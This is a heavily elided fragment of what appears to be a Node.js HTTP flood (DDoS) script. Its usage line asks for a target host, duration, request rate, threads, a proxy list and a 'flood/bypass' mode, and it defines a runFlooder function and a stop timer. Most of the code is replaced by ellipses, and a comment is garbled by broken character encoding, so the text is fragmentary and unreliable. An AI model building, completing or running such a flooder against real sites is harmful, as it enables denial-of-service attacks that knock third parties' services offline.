...
const secureOptions = 
 ...
 if (process.argv.length < 7){console.log(`Usage: by @npm_i_hqack>host time req thread proxy.txt flood/bypass`); process.exit();}
...
const randstrsValue = randstrs(10);
  function runFlooder() {
    ...
    let interval
	  ...
	  // T?o m?t d? tr? ng?u nhi�n t? 1000 d?n 500 mili gi�y
...
setTimeout(StopScript, args.time * 2000);
